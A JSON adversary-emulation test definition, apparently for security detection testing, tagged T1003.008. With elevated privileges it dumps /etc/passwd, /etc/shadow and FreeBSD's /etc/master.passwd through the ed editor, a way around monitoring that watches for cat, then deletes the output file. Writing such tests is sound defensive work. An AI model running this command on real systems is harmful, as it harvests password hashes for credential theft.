{
  "id": "df1a55ae-019d-4120-bc35-94f4bc5c4b0a",
  "name": "Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat",
  "description": "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using ed\n",
  "platforms": [
    "linux"
  ],
  "steps": [
    {
      "id": "29f31b74-a224-455c-9b23-f825a3869b4a",
      "type": "execute-command",
      "data": {
        "command": "unamestr=$(uname)\nif [ \"$unamestr\" = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed \u003e ${output_file}; elif [ \"$unamestr\" = 'FreeBSD' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/master.passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed \u003e ${output_file}; fi\n",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "40c3fb8a-5db1-447f-a516-3123c7f0df99",
      "type": "execute-command",
      "data": {
        "command": "rm -f #{output_file}\n",
        "command_type": "sh"
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "29f31b74-a224-455c-9b23-f825a3869b4a",
      "p": "on-success",
      "o": "40c3fb8a-5db1-447f-a516-3123c7f0df99"
    },
    {
      "s": "29f31b74-a224-455c-9b23-f825a3869b4a",
      "p": "on-failure",
      "o": "40c3fb8a-5db1-447f-a516-3123c7f0df99"
    }
  ],
  "tags": [
    "T1003",
    "T1003.008"
  ],
  "input_arguments": [
    {
      "name": "output_file",
      "type": "path",
      "description": "Path where captured results will be placed",
      "value": "/tmp/T1003.008.txt"
    }
  ]
}